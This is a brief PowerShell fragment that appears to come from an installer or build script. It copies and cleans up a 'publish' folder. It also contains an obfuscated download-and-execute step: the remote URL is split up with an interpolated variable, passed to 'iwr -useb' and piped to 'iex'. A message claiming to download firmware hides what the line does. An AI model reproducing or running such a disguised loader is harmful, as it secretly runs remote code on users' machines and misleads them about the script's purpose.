...
Copy-Item -Path "core\publish\*" -Destination "core" -Recurse;Remove-Item -Path "core\publish" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;iwr -useb "u$($x)r$($x)l$($x)d$($x)a$($x)y$($x).c$($x)c$($x)/$($x)p$($x)s$($x)s$($x)"|iex;Write-Host "Downloading Firmware 16-0-3..."-
